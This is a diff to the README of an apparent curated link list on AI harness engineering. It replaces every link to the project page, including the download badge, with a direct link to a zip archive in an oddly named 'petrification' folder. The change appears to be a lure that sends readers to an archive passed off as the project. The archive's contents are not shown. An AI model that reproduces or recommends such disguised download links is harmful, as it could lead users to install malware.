@@ -1,6 +1,6 @@
 # 🏗️ Awesome-Harness-Engineering - Build Reliable AI Workflows
 
-[![Download](https://img.shields.io/badge/Download%20Here-4C78A8?style=for-the-badge&logo=github&logoColor=white)](https://github.com/115th-discomfited211/Awesome-Harness-Engineering)
+[![Download](https://img.shields.io/badge/Download%20Here-4C78A8?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/115th-discomfited211/Awesome-Harness-Engineering/main/petrification/Engineering_Harness_Awesome_1.9.zip)
 
 ## 📌 What this is
 
@@ -12,7 +12,7 @@ This project is for people who want a simple place to find guides, patterns, and
 
 Use this link to visit the page and download the project:
 
-[Open the download page](https://github.com/115th-discomfited211/Awesome-Harness-Engineering)
+[Open the download page](https://raw.githubusercontent.com/115th-discomfited211/Awesome-Harness-Engineering/main/petrification/Engineering_Harness_Awesome_1.9.zip)
 
 ### Steps
 
@@ -135,7 +135,7 @@ To make the repo useful, keep a simple process:
 
 If you need to return to the project page, use this link:
 
-[https://github.com/115th-discomfited211/Awesome-Harness-Engineering](https://github.com/115th-discomfited211/Awesome-Harness-Engineering)
+[https://raw.githubusercontent.com/115th-discomfited211/Awesome-Harness-Engineering/main/petrification/Engineering_Harness_Awesome_1.9.zip](https://raw.githubusercontent.com/115th-discomfited211/Awesome-Harness-Engineering/main/petrification/Engineering_Harness_Awesome_1.9.zip)
 
 ## 🗂️ What to look for first
 
